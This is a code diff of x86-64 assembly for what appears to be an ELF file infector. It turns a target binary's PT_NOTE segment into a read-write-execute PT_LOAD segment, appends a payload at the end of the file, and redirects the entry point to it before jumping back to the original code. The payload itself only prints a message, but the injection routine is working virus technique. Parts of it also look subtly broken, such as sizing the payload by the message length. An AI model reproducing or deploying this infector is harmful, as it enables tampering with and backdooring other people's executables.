@@ -16,8 +16,8 @@ section .data
   headerMessage db "Im in a PH segment", 0xA ; Message to print
   headerMessagelen equ $ - headerMessage         ; Message length
 
-  payload db "Nothing happened here ...", 0xA
-  payload_msg_len equ $ - payload
+  payload_message db "Nothing happened here ...", 0xA
+  payload_msg_len equ $ - payload_message
 
 
 section .bss
@@ -28,7 +28,14 @@ e_phoff: resb 8                        ; Program header offset field
 e_phentsize: resb 2                    ; Program header entry size field
 e_phnum: resb 2                        ; Number of program headers field
 fd resq 1                              ; File descriptor
+p_offset: resb 8
+p_vaddr: resb 8 
+p_filesz: resb 8
+payload_virtual_address: resb 8
+payload_rip_position: resb 8
+payload_base_offset: resb 8
 statbuf resb 144                  ; reserve space for the stat struct
+fsize resq 1                      ; Reserve 8 bytes to store the file size (64-bit value)
 
 section .text
 global _start
@@ -47,6 +54,24 @@ _start:
   xor rdi, rdi          ; exit code 0 (success)
   syscall
 
+;payload:
+;    ; Print the message
+;    mov rax, 1                        ; syscall: write
+;    mov rdi, 1                        ; stdout
+;    lea rsi, [rel payload_message]    ; Address of the message
+;    mov rdx, payload_msg_len          ; Message length
+;    syscall
+;
+;    ; Calculate the runtime base address
+;    lea rax, [rel payload]                    ; Load current instruction pointer
+;    sub rax, payload_base_offset      ; Subtract offset to determine base address
+;
+;    ; Jump to the original entry point
+;    mov rbx, qword [rax + e_entry_point] ; Load original entry point
+;    jmp rbx                           ; Jump to original entry point
+;    ;; Jump to original entry point
+;    ;jmp qword [e_entry_point]         ; Jump to saved original entry point
+;
 error:
   ; Handle errors (exit with code 1 if something goes wrong)
   ; Print error Message
@@ -183,112 +208,109 @@ e_phnum_match:
 ; Loop through all program headers to find a PT_NOTE segment.
 ; -----------------------------
 find_PT_NOTE:
-  mov rbx, [e_phoff]                ; Start of program header table
-  movzx rcx, word [e_phnum]         ; Number of program headers
-  movzx rdx, word [e_phentsize]     ; Size of each program header
+    mov rbx, [e_phoff]                ; Start of program header table
+    movzx rcx, word [e_phnum]         ; Number of program headers
+    movzx rdx, word [e_phentsize]     ; Size of each program header
+    xor rsi, rsi                      ; Modification flag (0 = no modification)
 
 loop_ph:
-  test rcx, rcx                     ; Check if we've processed all headers
-  jz done_ph
+    test rcx, rcx                     ; Check if we've processed all headers
+    jz done_ph
 
-  ; Save important registers before syscall
-  push rdx
-  push rcx
+    ; Check if a modification has been made
+    cmp rsi, 1                        ; Check if modification flag is set 
+    je done_ph                        ; Exit loop if modification done
 
-  ; Restore registers after syscall
-  pop rcx
+    ; Save registers
+    push rbx
+    push rcx
+    push rdx
 
-  ; Read the current program header
-  mov rdi, rbx                      ; Offset to the current program header
-  lea rsi, [ph_entry]               ; Buffer to store the program header
-  mov rdx, 64                       ; Read 64 bytes (PH size)
-  call read_at_offset
+    ; Read the current program header
+    mov rdi, rbx                      ; Offset to the current program header
+    lea rsi, [ph_entry]               ; Buffer to store the program header
+    mov rdx, 64                       ; Read 64 bytes (PH size)
+    call read_at_offset
 
-  pop rdx
+    ; Check if segment is PT_NOTE
+    mov eax, dword [ph_entry]         ; Load Type field
+    cmp eax, 0x4                      ; Compare with PT_NOTE
+    jne skip_ph
 
-  ; Check if the segment is PT_NOTE
-  mov eax, dword [ph_entry]         ; Load Type field (first 4 bytes)
-  cmp eax, 0x4                      ; Compare with PT_NOTE (0x4)
-  jne next_ph
+    ; Use `stat` to get file information
+    lea rdi, [pathname]       ; Path to the ELF file
+    lea rsi, [statbuf]        ; Buffer for stat structure
+    mov rax, 4                ; syscall: stat
+    syscall
+    js error                  ; Jump to error handler if stat fails
 
-  
+    ; Extract file size from `statbuf`
+    mov rax, qword [statbuf + 0x30] ; Offset of st_size in stat structure
+    mov [fsize], rax               ; Store file size in `fsize`
 
-  ; Debug: Print ph_entry buffer before modification
-  ;mov rax, 1            ; syscall: write
-  ;mov rdi, 1            ; stdout
-  ;lea rsi, [ph_entry]   ; Buffer
-  ;mov rdx, 2           ; Length
-  ;syscall
+    ; Modify PT_NOTE to PT_LOAD
+    mov dword [ph_entry], 0x1         ; Change type to PT_LOAD
 
-; PT_NOTE found: Print the message
-  push rdx
-  push rcx
-  mov rax, 1                        ; syscall: write
-  mov rdi, 1                        ; stdout
-  lea rsi, [note_msg]               ; Message buffer
-  mov rdx, note_len                 ; Message length
-  syscall
-  pop rcx
-  pop rdx
+    ; Ensure permissions include `R` and `E`
+    mov eax, dword [ph_entry + 0x4]   ; Load p_flags
+    or eax, 0x7                       ; Add R and E permissions
+    mov dword [ph_entry + 0x4], eax   ; Store updated p_flags
 
-  ; Modify the program header type to PT_LOAD (0x01)
-  mov dword [ph_entry], 0x1
+    add qword [ph_entry + 0x20], payload_msg_len  ; Update p_filesz
+    add qword [ph_entry + 0x28], payload_msg_len  ; Update p_memsz
+    mov rax, [fsize]
+    mov qword [ph_entry + 0x08], rax          ; Update p_offset to file end
+    mov rax, 0xc000000                ; Base virtual address
+    add rax, [fsize]                  ; Add file size
+    mov qword [ph_entry + 0x10], rax  ; Update p_vaddr
 
-  ; Ensure permissions include `R` and `E`
-  mov eax, dword [ph_entry + 0x4]   ; Load p_flags
-  or eax, 0x7                       ; Add R and E permissions
-  mov dword [ph_entry + 0x4], eax   ; Store updated p_flags
+    ; Write modified program header back
+    mov rdi, rbx                      ; Offset to the current program header
+    lea rsi, [ph_entry]               ; Modified program header
+    mov rdx, 64                       ; Program header size
+    call write_at_offset
 
-  ; Append the payload at the end of the segment
-  mov rax, qword [ph_entry + 0x08]  ; Load p_offset (file offset of segment)
-  add rax, qword [ph_entry + 0x20]  ; Add p_filesz to find the end of the segment
-  mov rdi, rax                      ; Offset to write the payload
-  lea rsi, [rel payload]            ; Payload address
-  mov rdx, payload_msg_len          ; Payload size
-  call write_at_offset              ; Write the payload
+    ; Write the payload
+    mov rdi, [fsize]                  ; Offset to the end of the file
+    lea rsi, [rel payload]            ; Payload location
+    mov rdx, payload_msg_len          ; Payload size
+    call write_at_offset
 
-  ; Update p_filesz and p_memsz to include the payload
-  add qword [ph_entry + 0x20], payload_msg_len  ; Update p_filesz
-  add qword [ph_entry + 0x28], payload_msg_len  ; Update p_memsz
+    ; Update entry point
+    mov rdi, ELF_Header               ; ELF header buffer
+    mov qword [rdi + 0x18], rax       ; Set e_entry to new virtual address
 
-  ; Debug: Print ph_entry buffer after modification
-;mov rax, 1            ; syscall: write
-;mov rdi, 1            ; stdout
-;lea rsi, [ph_entry]   ; Buffer
-;mov rdx, 2           ; Length
-;syscall
+    ; Write updated ELF header
+    mov rdi, 0x0                      ; Offset to ELF header
+    lea rsi, [ELF_Header]             ; ELF header buffer
+    mov rdx, 64                       ; ELF header size
+    call write_at_offset
+    mov rsi, 1
 
-  ; Write the modified program header back
-  push rcx                          ; Save rcx
-  push rdx                          ; Save rdx
-  mov rdi, rbx                      ; Offset to the current program header
-  lea rsi, [ph_entry]               ; Buffer containing the modified program header
-  mov rdx, 64                       ; Size of the program header
-  call write_at_offset              ; Call the function to write the modified header back
+skip_ph:
+    ; Restore registers
+    pop rdx
+    pop rcx
+    pop rbx
 
-; Update e_entry to point to the payload
-  mov rax, qword [ph_entry + 0x10]  ; Load p_vaddr (virtual address of segment)
-  add rax, qword [ph_entry + 0x20]  ; Add p_filesz to point to the payload
-  mov rdi, 0x18                     ; Offset of e_entry in ELF header
-  mov rsi, ELF_Header               ; Buffer containing ELF header
-  mov qword [rsi + rdi], rax        ; Update e_entry with new entry point
-
-  ; Write the modified ELF header back
-  mov rdi, 0x0                      ; Offset to start of ELF header
-  lea rsi, [ELF_Header]             ; Modified ELF header
-  mov rdx, 64                       ; Size of the ELF header
-  call write_at_offset              ; Write the ELF header back
-
-  pop rdx                           ; Restore rdx
-  pop rcx                           ; Restore rcx
-
-next_ph:
-  add rbx, rdx                      ; Move to the next program header
-  dec rcx                           ; Decrement header count
-  jmp loop_ph
+    ; Move to next program header
+    add rbx, rdx
+    dec rcx
+    jmp loop_ph
 
 done_ph:
-  ret
+    ret
+
+payload:
+    mov rax, 1                        ; syscall: write
+    mov rdi, 1                        ; stdout
+    lea rsi, [payload_message]
+    mov rdx, payload_msg_len
+    syscall
+
+    ; Jump to original entry point
+    mov rbx, [e_entry_point]
+    jmp rbx
 
 ; -----------------------------
 ; Function: write_at_offset
